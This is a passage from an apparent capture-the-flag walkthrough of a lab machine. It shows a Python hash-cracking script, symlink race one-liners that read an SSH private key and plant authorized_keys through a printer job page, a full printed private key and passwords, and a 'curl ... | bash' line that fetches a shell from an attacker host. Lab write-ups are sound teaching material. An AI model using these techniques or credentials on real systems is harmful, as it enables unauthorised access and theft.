Since I’m going to need to write my own brute-force script, I’m going to use Python instead of PHP. I will first start with Elisa’s password and make sure the code works, and then pivot to Server Admin. I’ll open a Python3 REPL and import `crypt` and `hashlib`:

```

root@kali# python3
Python 3.8.2 (default, Apr  1 2020, 15:52:55) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import hashlib
>>> import crypt

```

`crypt.crypt` seems to work the same as PHP:

```

>>> crypt.crypt('Quick4cc3$$','fa')
'faue2Hiwim8Bc'

```

If I try to run `hashlib.md5` on the result, it complains about encoding. I’ll encode the output, and then pass it to `md5`, and it works:

```

>>> hashlib.md5(crypt.crypt('Quick4cc3$$','fa').encode()).hexdigest()
'c6c35ae1f3cb19438e0199cfa72a9d9d'

```

With that, I’ve got to wrap a short script around it. I found that (at least my copy of)`rockyou.txt` actually crashes if you try to read lines as strings:

```

>>> with open('/usr/share/wordlists/rockyou.txt', 'r') as f:
...     a = f.read()
... 
Traceback (most recent call last):
  File "<stdin>", line 2, in <module>
  File "/usr/lib/python3.8/codecs.py", line 322, in decode
    (result, consumed) = self._buffer_decode(data, self.errors, final)
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 5079973: invalid continuation byte

```

So I’ll read them in as bytes, decode them to pass to `crypt`. The resulting script is:

```

#!/usr/bin/env python3

import crypt
import hashlib
import sys

with open(sys.argv[2], 'rb') as f:

    for passwd in f:
        try:
            if hashlib.md5(crypt.crypt(passwd.strip().decode(), 'fa').encode()).hexdigest() == sys.argv[1]:
                print(f'[+] Found password: {passwd.decode()}')
                sys.exit()
        except UnicodeDecodeError:
            pass

```

It takes two args: the hash to compare to, and the wordlist file to loop over. I can test it by adding elisa’s password to a file, and then giving it her hash:

```

root@kali# ./crack_hash.py c6c35ae1f3cb19438e0199cfa72a9d9d passwords 
[+] Found password: Quick4cc3$$

```

Now I’ll give it srvadm’s hash and `rockyou.txt`, and it cracks in seven seconds:

```

root@kali# time ./crack_hash.py e626d51f8fbfd1124fdea88396c35d05 /usr/share/wordlists/rockyou.txt 
[+] Found password: yl51pbx

real    0m6.826s
user    0m6.780s
sys     0m0.024s

```

I can submit that password with srvadm@quick.htb and it logs in, redirecting the browser to `home.php`:

![image-20200508110036888](https://0xdfimages.gitlab.io/img/image-20200508110036888.png)

### Printerv2 Enumeration

On `home.php` there are links to `printers.php`, and `add_printer.php`. `printers.php` has a table listing the printers, currently none:

![image-20200508110644087](https://0xdfimages.gitlab.io/img/image-20200508110644087.png)

Clicking “add one” or on “Add Printer” at the top directs to `add_printer.php`:

![image-20200508110716173](https://0xdfimages.gitlab.io/img/image-20200508110716173.png)

I started `nc` on port 9100 to see when it connects. I can add a printer with my IP, and there’s no connect, it just says “Printer Added”. Back on `printers.php`, it now shows up:

![image-20200508110836229](https://0xdfimages.gitlab.io/img/image-20200508110836229.png)

The trashcan icon goes to `http://printerv2.quick.htb:9001/printers.php?job=delete&title=0xdf`, and removes the printer from the database. The printer icon makes an connection to my host on 9100, and immediately disconnects:

```

root@kali# nc -lnvp 9100
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9100
Ncat: Listening on 0.0.0.0:9100
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:59960.

```

Now the page shows a banner with a link to `http://printerv2.quick.htb:9001/job.php?title=0xdf`:

![image-20200508111013493](https://0xdfimages.gitlab.io/img/image-20200508111013493.png)

That link presents a form:

![image-20200508111115450](https://0xdfimages.gitlab.io/img/image-20200508111115450.png)

If I enter “This is a test” into Bill Details and hit submit, a green box says “Job assigned”. Back on `nc`, there’s a connect, as well as the test I submitted plus a bit more:

```

root@kali# nc -lnvp 9100
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9100
Ncat: Listening on 0.0.0.0:9100
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:60002.
This is a testVA

```

I’ll do that again, this time saving the `nc` output to a file:

```

root@kali# nc -lnvp 9100 | tee print_connection
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9100
Ncat: Listening on 0.0.0.0:9100
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:60002.
This is a testVA

```

In addition to the ASCII I can see above, some control bytes are being sent as well:

```

root@kali# xxd print_connection 
00000000: 1b40 5468 6973 2069 7320 6120 7465 7374  .@This is a test
00000010: 1d56 4103                                .VA.

```

### Code Review

Looking at the code, there’s an interesting section of code at the top of `jobs.php` that handles receiving the message and sending it to the printer:

```

if($_SESSION["loggedin"])
{
        if(isset($_POST["submit"]))
        {
                $title=$_POST["title"];
                $file = date("Y-m-d_H:i:s");
                file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
                chmod("/var/www/printer/jobs/".$file,"0777");
                $stmt=$conn->prepare("select ip,port from jobs");
                $stmt->execute();
                $result=$stmt->get_result();
                if($result->num_rows > 0)
                {
                        $row=$result->fetch_assoc();
                        $ip=$row["ip"];
                        $port=$row["port"];
                        try
                        {
                                $connector = new NetworkPrintConnector($ip,$port);
                                sleep(0.5); //Buffer for socket check
                                $printer = new Printer($connector);
                                $printer -> text(file_get_contents("/var/www/jobs/".$file));
                                $printer -> cut();
                                $printer -> close();
                                $message="Job assigned";
                                unlink("/var/www/jobs/".$file);
                        }
                        catch(Exception $error) 
                        {
                                $error="Can't connect to printer.";
                                unlink("/var/www/jobs/".$file);
                        }
                }
                else
                {
                        $error="Couldn't find printer.";
                }
        }

?>

```

What’s interesting is how it uses the filesystem. Assuming I’m coming from a registered printer, the following code is run:

```

file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
chmod("/var/www/printer/jobs/".$file,"0777");
sleep(0.5); //Buffer for socket check
$printer = new Printer($connector);
$printer -> text(file_get_contents("/var/www/jobs/".$file));
$printer -> cut();
$printer -> close();
unlink("/var/www/jobs/".$file);

```

I’m going to ignore the `chmod` command, because it’s pointing at the wrong directory. So the code simplifies to:
1. Filename is current timestamp.
2. Put user content into filename.
3. Sleep 0.5 seconds.
4. Read file and send contents to printer.
5. Delete file.

I did a bunch of testing locally, and learned some things about PHP:
- `file_get_contents` and `file_put_contents` will follow symlinks.
- `unlink` will delete a symlink, with no impact on the file it points to.

One bit of enumeration - the box will let me confirm that srvadm has a `.ssh` directory:

```

sam@quick:/$ ls -ld /home/srvadm/.ssh/
drwx------ 2 srvadm srvadm 4096 Mar 20 02:38 /home/srvadm/.ssh/

```

I’ll also use a trick to look at the files created in `/var/www/jobs`. I’ll create an infinite loop that watches for files and logs them:

```

sam@quick:/var/www/jobs$ while true; do ls -l | grep -v total >> /tmp/out; done

```

I’ll submit a job through the page, and then kill the loop and check out the results:

```

sam@quick:/var/www/jobs$ cat /tmp/out 
-rw-r--r-- 1 srvadm srvadm 9 May  8 20:29 2020-05-08_20:29:11
-rw-r--r-- 1 srvadm srvadm 9 May  8 20:29 2020-05-08_20:29:11
-rw-r--r-- 1 srvadm srvadm 9 May  8 20:29 2020-05-08_20:29:11

```

So the files are created readable by sam. I can’t write the file, but to delete the file, I only need [read and write permissions](https://stackoverflow.com/questions/54622606/what-permissions-are-needed-to-delete-a-file-in-unix) on the `jobs` directory itself, not on the file I want to detele, and I have that:

```

sam@quick:/var/www$ ls -ld jobs/
drwxrwxrwx 2 root root 53248 May  8 20:32 jobs/

```

This leaves two attacks, read as srvadm and write as srvadm, both of which work.

### Method 1: Read as srvadm

To read a file as srvadm, I will wait for a job file to be created, and then delete it and replace it with a symlink to the file I want to read. Then when the sleep expires, that content will be sent to my “printer”.

I’ll run the following one liner as sam:

```

sam@quick:/var/www/jobs$ while true; do for fn in *; do if [[ -r $fn ]]; then rm -f $fn; ln -s /home/srvadm/.ssh/id_rsa $fn; fi; done; done

```

Spread out for readability:

```

while true; do 
  for fn in *; 
    do if [[ -r $fn ]]; then 
      rm -f $fn; 
      ln -s /home/srvadm/.ssh/id_rsa $fn; 
    fi; 
  done; 
done

```

This loop is constantly listing the files in `jobs`. For each file, if it can read the file (ie, it’s the one created by the printer PHP page), it deletes it and creates a symlink to what I hope is a private key in srvadm’s home directory.

I’ll start `nc` on 9100 (where I registered my printer), and submit a job, contents don’t matter. `nc` sees two hits. I use `-k` so that it continue to listen after the first connection closes.

The first connection is the test connection to see if the “printer” is up, and then the contents of the job:

```

root@kali# nc -k -lnvp 9100
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9100
Ncat: Listening on 0.0.0.0:9100
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:39036.
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:39048.
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
+DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=
-----END RSA PRIVATE KEY-----
VA

```

With that key, I can connect as srvadm:

```

root@kali# ssh -i ~/keys/id_rsa_quick_srvadm srvadm@10.10.10.186
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri May  8 19:01:30 UTC 2020

  System load:  1.6                Users logged in:                0
  Usage of /:   30.0% of 19.56GB   IP address for ens33:           10.10.10.186
  Memory usage: 14%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-9ef1bb2e82cd: 172.18.0.1
  Processes:    125
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
54 packages can be updated.
28 updates are security updates.

Last login: Fri Mar 20 05:56:02 2020 from 172.16.118.129                                                   
srvadm@quick:~$

```

### Method 2: Write as srvadm

I can use a similar trick to write a file as srvadm. In this case, I’ll target `/home/srvadm/.ssh/authorized_keys` with my public key. This time, I’ll use this Bash one-liner:

```

sam@quick:/var/www/jobs$ while true; do find . -type l -delete; ln -sf /home/srvadm/.ssh/authorized_keys $(date '+%Y-%m-%d_%H:%M:%S'); sleep 0.1; done

```

Spread out for readability:

```

while true; do 
  find . -type l -delete; 
  ln -sf /home/srvadm/.ssh/authorized_keys $(date '+%Y-%m-%d_%H:%M:%S'); 
  sleep 0.1; 
done

```

This loop is a bit simpler. It just clears all links out of the `jobs` directory. Then it creates a job with the current timestamp using `date`. Then it sleeps 0.1 seconds (otherwise half the time it would find no link).

Now I submit a job, and this time, the contents are a public key I generated. Once it runs, I see the public key sent back on `nc`:

```

root@kali# nc -k -lnvp 9100
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::9100         
Ncat: Listening on 0.0.0.0:9100  
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:39230.
Ncat: Connection from 10.10.10.186.
Ncat: Connection from 10.10.10.186:39240.
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDuvHabP2Cb9+Y+psec9TVEpcFufsrx+E+mcpIhFgRyAcoEMU7gmeFxonOcANJ/DCNgv3FJEYMETfdvqW3AU8vJDPFpBkzywCMCVdn8xFAQZBt2FgdVwhTA1F05bjyx+CKh8aw6iuVJhVJ3TtbcEoGsWVXfXS1nWO+uSFIDTZNNUURZRyORJdQ7JH0wwKX42htJkyIeT+Rf+OOFbOcfkfmFbNoOVvk+zm5GZxZgiAyHTeTX8xT5i16Skm4VRCLy4tmDB7Ze80egJxbQHfjRKuFOHitbz2ls6KoYWWCsugbiADjizmYlrIGqlpadenNZhL3W+HVac9CvTuDj6lxLnswpzGVj/D69DGxq0zo9ZIa9iLK9zjkyWHWxVOPuvPAxTSFrcDStPrgws95IzVTlM5ogOp0LZodGsp7hr/+03mrIBf/UIYcPgyO5Mqbo2jvtklo9ZyI2kpu+5D7FFS7YRbvLYOYvpRyGHUfpnUSEtKLRCg0ofcsoKYYPJqzrilFcPK8= root@kali

```

And now I can connect with the matching private key:

```

root@kali# ssh -i ~/keys/gen srvadm@10.10.10.186
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri May  8 20:53:43 UTC 2020

  System load:  0.01               Users logged in:                2
  Usage of /:   30.1% of 19.56GB   IP address for ens33:           10.10.10.186
  Memory usage: 16%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-9ef1bb2e82cd: 172.18.0.1
  Processes:    136
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

54 packages can be updated.
28 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri May  8 20:12:34 2020 from 10.10.14.47
srvadm@quick:~$

```

## Priv: srvadm –> root

### Enumeration

For HTB machines, there are files in every home directory, and then there are ones that are unusual. I like to run a `find` to get files in the homedir, and usually it doesn’t overflow the screen.

```

srvadm@quick:~$ find . -type f -ls
   281794      4 -rw-r--r--   1 srvadm   srvadm       4038 Mar 20 06:23 ./.cache/conf.d/printers.conf
   281793      8 -rw-r--r--   1 srvadm   srvadm       4569 Mar 20 06:20 ./.cache/conf.d/cupsd.conf
   281799     72 -rw-rw-r--   1 srvadm   srvadm      71479 Mar 20 06:46 ./.cache/logs/debug.log
   281798      4 -rw-rw-r--   1 srvadm   srvadm       1136 Mar 20 06:39 ./.cache/logs/error.log
   281791     12 -rw-r--r--   1 srvadm   srvadm       9064 Mar 20 06:19 ./.cache/logs/cups.log
   281425      0 -rw-r--r--   1 srvadm   srvadm          0 Mar 20 02:38 ./.cache/motd.legal-displayed
   281369      4 -rw-r--r--   1 srvadm   srvadm        220 Mar 20 02:16 ./.bash_logout
   281797      4 -rw-------   1 srvadm   srvadm         23 Mar 20 06:46 ./.local/share/nano/search_history
   281421      4 -rw-r--r--   1 srvadm   srvadm        222 Mar 20 02:38 ./.ssh/known_hosts
   281420      4 -rw-r--r--   1 srvadm   srvadm        564 May  8 20:53 ./.ssh/authorized_keys
   281418      4 -rw-------   1 srvadm   srvadm       1679 Mar 20 02:37 ./.ssh/id_rsa
   281419      4 -rw-r--r--   1 srvadm   srvadm        394 Mar 20 02:37 ./.ssh/id_rsa.pub
   281370      4 -rw-r--r--   1 srvadm   srvadm       3771 Mar 20 02:16 ./.bashrc
   281371      4 -rw-r--r--   1 srvadm   srvadm        807 Mar 20 02:16 ./.profile

```

It’s not completely uncommon to have a `.cache` directory, but it’s not standard. `.conf` files are particularly interesting.

In `.cache/conf.d/printers.conf`, there’s a handful of printer objects, including this one:

```

<Printer OLD_Aviatar>
PrinterId 2
UUID urn:uuid:0929509f-7173-3afd-6be2-4da0a43ccefe
Info 8595
Location Aviatar
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
State Idle
StateTime 1549274624
ConfigTime 1549274625
Type 8401100
Accepting Yes
Shared Yes
JobSheets none none
QuotaPeriod 0
PageLimit 0
KLimit 0
OpPolicy default
ErrorPolicy stop-printer
Option job-cancel-after 10800
Option media 1
Option output-bin 0
Option print-color-mode color
Option print-quality 5
</Printer>

```

The `DeviceURI` is for `printerv3.quick.htb`, and it includes a username and a password. To make sure I get the url decode correct, I’ll use Python:

```

srvadm@quick:~$ python3 -c 'import urllib.parse; print(urllib.parse.unquote_plus("https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer"))'
https://srvadm@quick.htb:&ftQ4K3SGde8?@printerv3.quick.htb/printer

```

I’ve got a new set of creds: srvadm@quick.htb / &ftQ4K3SGde8?

### su

This works as the root password:

```

srvadm@quick:~$ su -
Password: 
root@quick:~#

```

And I can grab `root.txt`:

```

root@quick:~# cat root.txt
c76d414e************************

```

## Beyond Root

I was really curious to know why things broke when I tried to get a shell in on `.xsl` file using ESI injection. I ran `strace` on the `esigate` process.

I’ll get the pid, 1137, from `ps`:

```

root@quick:~/.cache# ps auxww | grep esi
sam        1135  0.0  0.0   4628   828 ?        Ss   May08   0:00 /bin/sh -c /usr/bin/java -Desigate.config=/home/sam/esigate-distribution-5.2/apps/esigate.properties -Dserver.port=9001 -jar /home/sam/esigate-distribution-5.2/apps/esigate-server.jar start
sam        1137  0.1  3.5 3670048 142672 ?      Sl   May08   0:27 /usr/bin/java -Desigate.config=/home/sam/esigate-distribution-5.2/apps/esigate.properties -Dserver.port=9001 -jar /home/sam/esigate-distribution-5.2/apps/esigate-server.jar start
root     130917  0.0  0.0  13136  1052 pts/0    S+   00:38   0:00 grep --color=auto esi

```

Now, I’ll use `-f` to follow forks into child processes, `-o st` to save the output to a file (because there will be a lot), and `-p 1137` to attack to the `esigate` process:

```

root@quick:~/.cache# strace -o st -f -p 1137
strace: Process 1137 attached with 61 threads

```

Now I’ll send an `.xsl` file with the following `cmd`:

```

curl -s http://10.10.14.47/shell | bash

```

Now I can kill `strace`, and check out the output. I’ll search for `curl` and find where the new process is started:

```

131007 execve("/usr/bin/curl", ["curl", "-s", "http://10.10.14.47/shell", "|", "bash"], 0x7ffc7d5fc080 /* 6 vars */) = 0

```

It’s not using `|` as redirection of output, but rather as an argument to `curl`. It is literally trying to retrieve three websites, `http://10.10.14.47/shell`, `|` and `bash`. That explains why these commands weren’t working.